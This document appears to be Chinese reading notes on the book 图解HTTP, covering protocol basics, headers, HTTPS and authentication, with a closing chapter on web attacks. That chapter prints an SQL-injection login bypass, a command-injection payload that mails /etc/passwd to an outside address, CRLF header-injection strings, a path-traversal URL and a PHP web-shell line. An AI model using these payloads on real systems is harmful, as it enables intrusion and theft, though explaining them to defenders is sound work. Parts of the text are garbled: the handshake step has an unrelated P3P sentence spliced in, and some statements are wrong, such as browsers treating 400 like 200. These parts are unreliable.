# 图解HTTP

##1. 了解Web

###1.1 三次握手

1. 发送端标有SYN(synchronize)标志的数据给接收端
2. 接收端回传一个带有SYN和ACK(acknowledgement)标志的数据包以示传达成功.
3. 发送端再回传带有ACK标志3. 从P3P隐私中新建Compact policies后输入到HTTP响应中的数据包,结束.

###1.2 请求报文 & 响应报文

![请求报文](QQ20160114-0.png)

其实请求报文也有主体,一般当方式为POST,参数就作为请求报文的主体,首部和主体靠空行(CR回车符+LF换行符)相隔开.

1. 请求报文的起始行叫请求行: 包含请求方法 请求URI HTTP版本.
2. 响应报文的起始行叫状态行: 包含HTTP版本 响应结果状态码 原因短语.
3. 首部字段: 表示请求/响应的各种条件和属性的各类首部.一般的首部有通用首部,请求首部,响应首部和实体首部.
4. 其他: HTTP的RFC里未定义的首部(Cookie等)

###1.3 报文主体和实体主体

1. 报文: 是HTTP通信中的基本单位,由8位组字节流组成,通过HTTP通信传输.用于传输请求/响应的实体主体.
2. 实体: 作为请求或响应的有效载荷数据(补充项)被传输,其内容由实体首部和实体主体组成.

通常,报文主体等于实体字体,只有当传输中进行编码操作时,实体主体发生变化,才导致它和报文主体产生差异.

###1.4 压缩

常用

1. gzip(GNU zip)
2. compress(UNIX系统的标准压缩)
3. deflate(zlib)
4. identity(不进行编码)
5. sdch(Shared Dictionary Compression over HTTP)

笔者网站在Chrome47打开就会显示

    Accept-Encoding:gzip, deflate, sdch

###1.5 分块发送

当编码实体资源未全部传输完成,客户端无法显示请求页面.可以把数据分割为多块,称为分块传输编码,么一块都会用16进制标记块大小,而实体主体的最后一块会用"0(CR+LF)"标记.

HTTP1.1存在一种称为传输编码(Transfer Coding)机制,可以在通信时按某种编码方式传输,但只能作用于分块传输编码中.

###1.6 发送多种数据的多部分对象集合

1. multipart/form-data web表单上传文件时使用

2. multipart-byteranges

    状态码为206

在使用多部分集合时,首部字段都会加上Content-type

###1.7 获取部分内容的范围请求

在执行部分请求时,首部字段Range指定资源的byte范围

1. 获取5001~1000字节: `Range: bytes=5001-10000`
2. 获取5001之后全部:`Range: bytes=5001-`
3. 从一开始到3000和5000-7000字节的多重范围 : `Range:bytes=-3000, 5000-7000`

针对范围请求,返回状态码为206Partial Content,对于多重范围的请求,响应首部字段Content-Type表名multipart/byteranges后返回响应报文.

###1.8 内容协商返回最合适的内容

1. 服务器驱动协商:服务器根据首部字段自动处理
2. 客户端驱动协商:用户从浏览器显示手动选择
3. 透明协商,服务器驱动和客户端驱动各自进行内容协商.


## 2. 状态码

1. 1XX : 接受请求正在处理
2. 2XX : 请求处理成功
3. 3XX : 重定向状态码
4. 4XX : 服务器无法处理请求
5. 5XX : 服务器处理请求错误

详解: 

1. 200 OK 当请求方式不同,返回结果不同,GET请求资源的实体会作为响应返回,HEAD请求资源的实体首部不随报文主体响应返回.
2. 204 No Content 不允许返回任何实体的主题.
3. 206 Partial Content 返回指定资源的一部分请求

---

1. 301 Moved Permanently 永久性重定向
2. 302 Found 临时性重定向
3. 303 See Other 和302类似,不过303表明客户端应当采取GET方法获取资源
4. 304Not Modified表名客户端发送附带条件的请求(If-Math,If-Modified-Since等),服务区允许访问,但请求未满足条件,返回304
5. 307 临时重定向,和302类似,不过大多浏览器不会强迫把POST改为GET

301,302,303作为返回码返回,几乎所有浏览器都会默认把POST改为GET,并删除请求报文内的主题,之后请求会自动重新发送.

---
1. 400 Bad Request:   请求报文存在语法错误,浏览器会对待200一样对待此状态
2. 401 Unauthorized:请求需要通过HTTP认证(BASIC认证/DIGEST认证)等,但若之前进行过一次失败的认证,返回该状态码
3. 403 Foribdden : 无权限访问该资源
4. 404 服务器上没有请求的资源

---

1. 500 Internal Server Error表示服务器执行请求时发生了错误
2. 503 Service Unavailable 表示服务器超负载,无法处理请求.

##3. 与HTTP协作的Web服务器

###3.1 通信数据转发程序:代理 网关 隧道

1. 代理: 是一种有转发功能的应用程序.
    每次经过一个代理服务器时,都会增加Via首部字段以标记经过的合租记信息.
    
    使用代理原因有:是有缓存,对特定网站进行访问控制

    代理有两种基准分类,是否使用缓存/是否修改报文
    
    1. 缓存代理: 会预先将资源的副本缓存到代理服务器上
    2. 透明代理: 不对报文进行任何加工的代理成为透明代理,反之称为非透明代理
    
2. 网关: 网关和代理类似,但是网关能使通信线路上的服务器提供非HTTP服务.
3. 隧道: 可按要求建立一条与其他服务器的通信线路,加密,不会解析HTTP请求.

##4. HTTP首部

HTTP首部字段类型

1. 通用首部字段: 请求报文和响应报文都会使用
2. 请求首部字段: 客户端向服务器请求时使用
3. 响应首部字段: 服务器向客户端请求时使用
4. 实体首部字段: 针对请求报文和响应报文的实体部分使用的首部.

可以参考<https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9.4>

###4.1 通用首部字段

通用首部指:请求报文和响应报文双方都会使用的.

1. Cache-Control:操作缓存机制,可有多个值`,`分割
    
    缓存请求指令

    1. no-cache: 强制向服务器再次验证,可指定特定用户`no-cache=Location`,其实该指令代表不缓存过期的资源,缓存会向源服务器进行有效期确认后处理资源.
    2. no-store: 不缓存请求或响应的任何内容,该指令才是真正的不进行缓存.
    3. max-age=秒: 响应最大的Age值,如果判断缓存资源的缓存时间数值比指定的数值更小,那么客户端接受缓存的资源,另外max-age值为0,那么缓存服务器通常需要将请求转发给源服务器.
    4. max-stale=秒: 接受已过期的响应,如果该指令未指定参数值,无论经过多久,客户端都会接受响应,如果指定了值,即使过期,主要出于max-stale指定时间内,仍旧会被服务器接受.
    5. min-fresh=秒: 期望在指定时间内响应仍有效,要求缓存服务器返回至少还未超过指定时间的缓存资源.
    6. no-transform: 代理不可更改媒体类型,,可防止缓存/代理压缩图片等操作
    7. only-if-cached: 从缓存获取资源,要求服务器不重新加载响应,也不会再次确认资源的有效性,若发生请求缓存服务器本地缓存无响应,则返回504Gateway Timeout.
    8. cache-extension: 新指令标记(token).
    ---
    缓存响应指令
    
    1. public: 可向任一方提供响应缓存
    2. private: 仅向特定用户返回响应
    3. no-cache: 缓存前必须先确认其有效性
    4. no-store: 不缓存请求或响应的任何内容
    5. no-transform: 代理不可更改媒体类型,可防止缓存/代理压缩图片等操作
    6. must-revalidate: 可缓存但必须再向源服务器进行确认,代理缓存会向服务器再次验证即将返回的响应缓存目前是否仍然有效,若代理无法连通服务器再次获取有效资源,缓存必须给客户端一条504状态码.设置了该指令会忽略max-stale.
    7. proxy-revalidate: 要求中间缓存服务器对缓存的响应有效性再进行确认,和must-revaladate的区别是该方法不适用于非共享代理服务器,可以让用户只进行一次验证,其他用户再请求则无需验证.(该解释笔者参考下文<https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9.4>,
    
        The proxy-revalidate directive has the same meaning as the must- revalidate directive, except that it does not apply to non-shared user agent caches. It can be used on a response to an authenticated request to permit the user's cache to store and later return the response without needing to revalidate it (since it has already been authenticated once by that user), while still requiring proxies that service many users to revalidate each time (in order to make sure that each user has been authenticated). Note that such authenticated responses also need the public cache control directive in order to allow them to be cached at all.)

    8. max-age=秒: 响应最大的Age值,当源服务器设置了该值,缓存服务器将不对资源的有效性再作确认,而max-age数值代表资源保存为缓存的最长时间.HTTP1.1会忽略Expires,而HTTP1.0会忽略max-age,
    9. s-maxage=秒: 公共缓存服务器响应最大的Age值,只适用于多用户使用的公共缓存服务器,设置了该指令后,忽略Expires和max-age.
    10. cache-extension: 新指令标记(token),自己设定指令,给缓存服务器识别.
    
2. Connection

    作用:
    
    1. 控制不再转发给代理的首部字段:`Connection:不再转发的首部字段名`.
    2. 管理持久连接: HTTP1.1默认连接都是持久连接,当服务器明确想断开关系时:`Connection:close`在HTTP1.1版本之前默认连接未非持久连接的,需要持久连接可以`Connection:Keep-Alive`.

3. Date

    表名创建HTTP报文的日期和时间`Date:Sat, 16 Jan 2016 07:22:04 GMT`,不同版本的规则Date格式有所不一样.详情看本章一开头的链接.
4. Pragma: 旧版本主要设在通用首部字段,历史遗留字段.
5. Trailer: 说明报文主体记录了哪些首部字段,可应用在分块传输编码.
6. Transfer-Encoding: 规定报文主体采用的编码方式,HTTP1.1只对分块传输编码有效.
7. Upgrade: 检测HTTP或其他协议是否有更高版本使用,要和`Connection:Upgrade`联合使用.
8. Via: 追踪客户端和服务器之间的传播路径.每经过一个代理/网关,会在via增加代理/网关的信息,还可以避免回环.
9. Warning: Warning : [警告码][警告主机:端口号] "[警告内容]" ([日期时间]).

###4.2 请求首部字段

1. Accept: 告知服务器,客户端能处理媒体类型的优先级别,格式为type/subtype,例如客户端想要HTML资源时候`Accept: text/html application/xhtml+xml;q=0.9,*/*;q=0.8`q值为0~1,指定优先级.
2. Accept-Charset: 告知服务器客户端支持字符串的优先顺序.
3. Accept-Encoding: 告知服务器客户端支持的编码和优先顺序,gzip,deflate等
4. Accept-Language: 告知服务器客户端所需的语言及其优先级别.
5. Authorization: 告知服务器,客户端的认证信息.
6. Expect: 告知服务器,客户端需要某种特殊的行为,`Expect: 100-continue`,服务器无法识别特殊行为时,返回417Expectation Failed
7. From: 告知服务器客户端用户的电子邮件.
8. Host: 同一服务器运行两个Web,靠Host加以区分.
9. if-Match: 告知服务器资源的实体标记(ETag值),只有在服务器又匹配的ETag文件,资源才可返回.还可以使用`*`指定,代表忽略ETag值.
10. if-Modified-Since: 告知服务器若if-Modified-Since字段早于资源更新时间,则返回现有资源,若再if-Modified-Since晚于资源更新时间,则返回304NOT Modified
11. if-None-Match: 只有当if-none-Match字段和ETag值不一致时,可以处理这个请求.使用GET/HEAD方法使用if-none-Match,可获取最新的资源.
12. if-Range: 设定ETag/时间,和请求的资源的ETag/时间一致,作为范围请求处理,反之,返回全体资源.
13. if-unmodified-Since: 和if-Modified-Since作用相反.
14. Max-forwards: 设定最大的转发次数,当Max-Forwards为0时,由服务器直接请求.
15. Proxy-Authorization: 接受到服务器发送过来认证质询时,客户端发送此字段.和HTTP访问认证类似,不过该字段是代理和客户端认证
16. Range: 指定资源的部分请求
17. Referer: 会告知服务器请求原始资源的URL
18. TE: 告知服务器,客户端传输编码方式及优先级,和`Accept-Encoding`类似,但这个方法用于传输编码.书上写的模糊这两个方式的区别,一般浏览器看到的是`Accept-Encoding`比较多.
19. User-Agent: 浏览器信息和代理信息.

###4.3 响应首部字段

1. Accept-Ranges: 服务器告诉客户端,服务器能接受的处理范围请求,可处理范围请求时值为bytes,繁殖为none.
2. Age:源服务器在多久前创建了响应,若创建该响应的是缓存服务器,该值 指缓存后的响应再次发起认证完成的时间值.(代理创建响应时必须带上Age)
3. ETag: ETag告知客户端实体识别,强ETag,只要发生变化,ETag都会发生变化`ETag:"usagi-1234"`,弱ETag值只用于提示资源十分相同,当资源发生更笨变化时,才改变Etag`ETAG: W/"usagi-1234"`
4. Locaition: 重定向
5. Proxy-Authenticate: 该字段会由代理服务器所要求的认证信息发送给客户端.
6. Retry-After: 告知客户端过多久后重新访问,一般配合503和3xx
7. Server: 告诉客户端,服务器的运行环境
8. Vary: 代理服务器接受到Vary请求时,如果值和`Accept-Language`值相同,那么返回缓存结果,反之,重新从源服务器请求.
9. WWW-Authenticate: HTTP访问认证.

###4.4 实体首部字段

实体首部是包含在请求报文和响应报文中的实体部分所使用的首部.用于补充内容更新时间等与实体相关的信息.

1. Allow: GET,HEAD等,告知客户端服务器支持的Request-URI指定的所有HTTP方法,当服务器接受不支持的HTTP方法时,返回405 Method Not Allowed,并且会把所有能支持HTTP方法写入首部字段Allow后返回.
2. Content-Encoding: 告知客户端实体的主体部分的编码方式,gzip,compress等.
3. Content-Language: 告知客户端实体所用的语言
4. Content-Length: 服务器告诉客户端实体主体部分的大小(字节),当设置了内容编码传输时,不能再使用Content-Length.
5. Content-Location: 给出与报文主体部分相对应的URI,和首部字段Location不同,Content-Location表示报文主体返回资源的URI.例如当设置了Accept-Language时,返回页面内容和实际请求对象不同,Content-Location会写明URI.
6. Content-MD5: 客户端会对接受报文主体执行相同的MD5算法,然后和首部字段Content-MD5字段值比较.目的在于验证报文主体在传输过程是否保持了完整.对报文主体进行MD5算法得出128位二进制,再通过Base64编码后将结果写入Content-MD5,然后只能保证完整性,没有安全性可言,因为内容被篡改,Content-MD5也能被篡改.
7. Content-Range: 范围请求
8. Content-Type: 指定实体主体内对象的媒体类型,
9. Expires: 会将资源失效日期告知客户端,缓存服务器接收到含有Expires响应后,会以缓存来应答请求,在Expires字段值指定之前,响应的副本会被一直保存,当超过指定时间时,缓存服务器在请求发送过来时,会转向源服务器请求资源,源服务器不希望缓存服务器对资源缓存时,最好在Expires字段内写入首部字段Date相同的时间值.但是Cache-Control的max-age优先级高于Expires
10. Last-Modified: 指明该资源最后的修改时间.

###4.5 为Cookie服务的首部字段

1. Set-Cookie: 响应首部字段.
    1. NAME=VALUE
    2. expires=DATE 省略时,时间为SESSION
    3. path=Path 指定服务器存Cookie的文件夹,不指定则为默认文件夹
    4. domain=域名.不指定则默认服务器域名
    5. Secure: 仅在HTTPS使用Cookie
    6. HttpOnly: 加以限制,Cookie不能被js脚本访问.
2. Cookie: 请求首部字段,Cookie内容

##4.6 其他首部字段

1. X-Frame-Options:响应首部, 用于控制网站内容在其他Web网站的Frame标签内的显示问题,目的在于防止点击劫持.值:
    1. DENY: 拒绝
    2. SAMEORIGIN:仅在同源下的页面匹配时许可.
2. X-XSS-Protection: 请求首部,针对跨站脚本攻击

    0: 将XSS过滤设置成无效状态
    
    1: 将XSS过滤设置成有效状态
3. DNT: 请求首部, Do Not Track,拒绝个人信息被手机,0为同意被追踪,1为拒绝被追踪.
4. P3P: 响应首部,P3P代表在线隐私偏好平台,可以让Web网站上的个人隐私变成程序可理解的形式,创建P3P步骤
    1. 创建P3P隐私
    2. 创建P3P隐私对照文件后,保存命名为/w3c/p3p.xml
    3. 从P3P隐私中新建Compact policies后输入到HTTP响应中.
    
    ---
    详情见<http://www.w3.org/TR/P3P>

##7. 确保Web安全的HTTPS

现HTTP缺点

1. 通信明文,内容可被窃听
2. 不验证通信方的身份,可能遭遇伪装.
3. 无法验明报文完整性,可能被篡改.

###7.1 加密方式

1. 通信加密(SSL/TLS组合)
2. 内容加密,加密报文主体,但是报文首部未加密,仍有机会被篡改.


HTTP+加密+认证+完整性保护 =HTTPS

HTTPLS中的SSL是独立于在HTTP层和TCP层中间.

SSL采用公开密钥加密方式,即密钥被获取了,加密就无用了.

共享密钥加密的困境

加密和解密通用一个密钥叫做共享密钥加密,但这种方式在同学时会把密钥发送给对方.极为危险.

公开密钥,又称非对称密钥,有两把钥匙,一个私有密钥,一个公开密钥.

发送密文一方先使用对方的公开密钥进行加密,对方接受到信息以后,再用自己的密钥进行解密.

HTTPS通过两者混合的方式,因为公开密钥效率比共享密钥要低,所以第一次交换密钥环节时采用公开密钥,之后建立通信交换采用共享密钥加密方式.

但是我们如何识别服务器的公开密钥是正确的,所以交给权威的第三方(例如VeriSign),它负责认证出HTTPS证书.

##7.2 证书类别

1. EV SSL国际权威,证明通信一方服务器是否规范,另外运营的企业是否存在,有绿色钥匙的显示.
2. 自签名证书: OpenSSL开源程序,每个人都可以有一套属于证书,但浏览该服务器时会显示无法确认连接安全性,所以作用甚小.

##7.3 HTTPS通信步骤

1. 客户端发送ClientHello报文开始SSL通信,报文中包含客户端支持的SSL指定版本、支持的加密组件列表.
2. 服务器可进行SSL通信时,会以ServerHello报文作为应答,报文中也包含SSL版本和加密组件,服务器的加密组件从接受到的客户端加密组件内筛选出来的
3. 之后服务器发送Certificate报文,报文中包含公开密钥证书,报文中包含
公开密钥证书.
4. 最后服务器发送Server Hello Done报文通知客户端,最初阶段的SSL握手协商部分结束.
5. SSL第一次握手结束之后,客户端以Client Key Exchange报文作为回应,报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串,该报文已用步骤3中的公开密钥进行加密
6. 接着客户端继续发送Change Cipher Spec报文,该报文会提示服务器,在此报文之后采用Pre-master secret密钥加密,
7. 客户端发送Finished报文,该报文包含连接至今全部报文的整体校验值,这次握手能否成功,要以服务器能够正确解密为标准
8. 服务器通用发送Change Cipher Spec报文
9. 服务器同样发送Finished报文
10. 服务器和客户端的Finished报文交换完毕之后,SSL连接就算建立完成,通信会受SSL保护,开始发送HTTP请求
11. 应用层协议通信,发送HTTP响应
12. 最后由客户端断开链接,发送close_notify

为什么不都用HTTPS,因为使用HTTPS会增加CPU损耗和流量等,而且一年大概要交付600RNB左右呢...

##8. 访问用户认证.

核对信息的主要方式

1. 密码: 只有本人知道的字符串
2. 动态令牌: 仅限本人持有的设备内显示一次性密码
3. 数字证书: 仅限终端持有的信息
4. IC卡: 仅本人持有的信息
5. 生物认证: 指纹和虹膜等本人生理信息

HTTP1.1 使用认证的方式

1. BASIC认证 (基本认证)

    很可能被窃听,不常用安全性不高,HTTP1.0开始
    1. 服务器返回401,和WWW-Authenticate首部
    2. 客户端需要输入账号密码,结果形式:账号:密码,然后仅限BASE64编码转换.
    3. 服务器验证
    
2. DIGEST认证(摘要认证)
    
    HTTP1.1开始拥有

    1. 服务器返回401,和WWW-Authenticate首部,该字段内包含质问响应方式认证所需的临时质询吗(随机数,nonce)
    2. 客户端接受到401,和WWW-Authenticate的DIGEST认证信息,返回响应时,设定的Authenticate必须包含username,realm,nonce,uri,response字段信息,其中realm和nonce是从之前服务器接受到的响应字段.response信息为经过MD5运算的字符串.
    3. 服务器验证信息,认证通过后返回的首部会在Authentication-info写入成功信息.
3. SSL客户端认证
    
    实现这个步骤,需要事先客户端安装服务器的证书.

    SSL证书如果要从认证机构买每年1000多~1W多,自己搭建也可以,不过需要运维成本.一般SSL都会配合基于表单认证一块使用
    1. 接受到需要认证资源请求,服务器返回Certificate Request报文,要求客户端提供客户端证书.
    2. 用户选择发送证书后,客户端会把客户端证书信息以Client Certificate报文发送给服务器.
    3. 服务器验证成功后,开始HTTPS加密通信.
    
4. FormBase认证(基于表单认证)
    
    自己搭建表单认证, 应用Session管理及Cookie,这种方式Cookie最好加上httponly防止XSS攻击.一般表单中的密码,先利用给密码加盐(salt)增加额外信息(同一密码,由于salt不一样,保存信息也不一样.),再使用hash计算散列值.

    1. 客户端发送账号密码
    2. 客户端返回SessionID,保存在cookie里
    3. 客户端进行通信时,头部带服务器返回来的Cookie.
    
##9. HTTP追加协议.

HTTP瓶颈.

1. 一条连接智能发送一个请求
2. 请求智能从客户端开始,客户端不可以接受除响应以外的指令
3. 请求/响应首部未经压缩发送.
4. 发送冗长的首部
5. 可选压缩方式,而非强制压缩.

解决方式

1. Ajax: 局部刷新,异步刷新,可有一丢丢改善瓶颈作用.缺点是请求数变多.
2. Coment: 处理完请求后不立即返回,而是先挂起,等有刷新时再响应,这样一旦有更新,就可以反馈给客户端,坏处是连接连续时间变长.
3. SPDY: 谷歌发布,SDPY规定使用SSL,SDPY独立在HTTP和SSL中间,优点:

    1. 多路复用流: 通过单一TCOP可以处理无数HTTP.TCP利用率提高,但是单一IP有多个WEB,多路复用被多个WEB使用
    2. 赋予请求有限级: 给请求分配顺序
    3. 推送功能: 支持服务器主动推送数据.
    4. 服务器提醒功能: 服务器可以主动提醒客户端请求所需资源.

##9.1 全双工通信WebSocket   

WebScoket为HMTL5标准的一部分.

优点

1. 推送功能:支持服务器主动推数据
2. 减少通信量,一直保持连接状态.

实现WebSocket,需要进行一次握手

1. 请求: 请求头带有`Upgrade:websocket`(用这个还需加`Connection:Upgrade`)和Sec-WebSocket-Protocol字段内记录的子协议.子协议按WebSocket协议标准在连接分开使用时,定义连接名称.
2. 响应: 服务器返回101Switching Protocols响应,并返回Set-WebSocket-Accept,该值更根据之前Sec-WebSocket-Key字段生成.当然还需要Upgrade:websocket和Connection:Upgrade
3. 连接成功

使用方式建立50ms发送一次数据
```javascript
var socket =new WebSocket('ws://404mzk.com:12010/updates');
socket.onopen = function(){
    setInterval(function(){
        if(socket.bufferedAmount ==0){
            socket.send(getUpdateData());
        },50);
    });
}
```

##9.2 HTTP2.0

实现方式

1. SDPY
2. HTTP Speed+Mobility
3. Network-Friendly HTTPUpgrade

主要研究方向

1. 多路复用: SPDY
2. TLS义务化: Speed+Mobility
3. 协商: Speed+Nobility,Friendly
4. 客户端拉拽/服务器推送: Speed+Mobility
5. 流量控制: SPDY
6. WebSocket : Speed+Mobility

##9.3 WEB服务器管理文件的WebDAV

在WEB上操作文件系统.

理解概念

1. 集合: 统一管理多个资源的概念,集合为单位
2. 资源: 文件或集合称为资源
3. 属性: 定义资源的属性 key=value
4. 锁: 把文件设置为无法编辑状态,防止多人同时编辑时,同一时间写入

WebDAV内新增方法和状态码

1. PROPFIND: 获取属性
2. PROPPATCH: 修改属性
3. MKCOL: 创建集合
4. COPY:
5. MOVE
6. LOCK
7. UNLOCK

状态码

1. 102 Processing: 可正常处理,但目前处理中状态
2. 207 Multi-Status: 存在多种状态.
3. 422 Unprocessible Enity:格式正确 内容错误
4. 423 Locked
5. 424 Failed Dependency: 处理与某请求关联的请求失败,因此不再为何依赖关系.
6. 507 Insuffcient Storage: 报错控件不足

##10 WEB攻击技术

1. 主动攻击: SQL/OS命令注入
2. 被动攻击: 就是套路,一般是跨站脚本攻击和跨站点请求伪装.

    1. 攻击者设置好陷阱,陷阱会启动嵌入攻击代码的HTTP请求(一般是EMAIL)
    2. 用户中招后,浏览器触发陷阱
    3. 中招的浏览器会把攻击代码发给WEB,运行攻击代码
    4. 服务器执行完代码,村砸漏洞的服务器就会成为跳板,导致用户的COOKIE被劫持.
    
如何防范?.

1. 客户端验证
2. WEB验证(1. 输入值验证,输出值转义)

js不适合做防范,因为可以被篡改.

##10.1 跨站脚本

设置一样的界面,但是代码已被篡改.,诱导用户输入账号密码.

或者在url后面加上外部js的代码,加载外部js.

##10.2 SQL注入

1. 非法查看或篡改数据库内的数据
2. 规避认证
3. 执行和数据库服务器业务相关的程序

例如

```sql
select * from K where name="404" and password="123456";

篡改为

select * from K where name="404"--" password="123456";
```
这样就可以成功绕过登录密码查询

##10.3 OS注入

发送邮件核心代码为

```php
my $ad = $q->param('mailaddress');
open(MALL,"| /user/sbin/sendmail $adr");
```
攻击者以下面为邮箱地址

`; cat /etc/passwd | mail hack@404mzk.com`;
这样passwd文件内容就会发送过去邮箱.

##10.4 HTTP首部注入

是值在篡改响应首部,插入换行,添加任意首部/主体信息.

用`%0D%OA`代表换行符
1. 设置任何Cookie

    例如本来客户端请求是`Location:http://404mzk.com/?cat=101`
    
    用户把101更改为,`101%0D0ASet-Cookie:+SID=123456789`,这样就把cookie篡改了.
2. 重定向至任何URL
    
    `LOCATION%0D%0A=指定url`
3. 显示任何的主体9HTTP响应截断攻击)

    `%OD%OA%OD%OA<html><HEAD><TITLE>显示内容<!--`,利用这个攻击,黑客可伪造Web页面要求输入个人信息.

HTTP1.1汇集了多响应返回功能,导致缓存服务器对任意内容进行缓存,造成缓存污染.

##10.5 邮件首部注入攻击

WEB的反馈页,填写邮箱地址和咨询内容,

例如在邮件地址输入 `mai@404mzk.com%0D0ABcc: user@example.com`

一旦服务器接受了这个换行符,就可实现Bcc邮件地址的追加发送.

或者`mai@404mzk.com%0D0A%0D0ATest Message`

就可篡改邮件内容.

##10.6 目录遍历攻击,

通过`../`相对定位到/etc/passwd等决定地址上.

本来路径`http://404mzk.com/read.php?log=0401.log`

篡改为

`http://404mzk.com/read.php?log=../../etc/passwd`,可以尝试多个`../`来寻找真正的根目录.

##10.7 远程文件包含漏洞.

指当前部分脚本你让需要从其他文件读入时,攻击者利用指定的url充当依赖文件.

例如在url中引用外部文件

`http://404mzk.com/foo.php?mod=news.php`

foo.php代码
```php
$modname = $_GET['mod'];
inclide($modname);

讲mod改成自己的服务器的php文件,代码

```php
<? system($_GET['cmd'])?>
```
system命令是执行OS命令






